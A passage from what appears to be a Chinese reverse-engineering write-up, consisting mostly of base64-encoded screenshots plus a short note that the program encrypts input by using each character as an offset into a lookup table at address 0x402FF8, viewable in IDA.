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
TkSuQmCC'/><br>由此得知加密算法为：将所输入的字符串的每个字符分别与<code>0x402FF8</code>相加，在此处所对应的字符即为加密后的新字符<br>可以在在ida中找到该地址<br><img src='data:img/jpg;base64,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
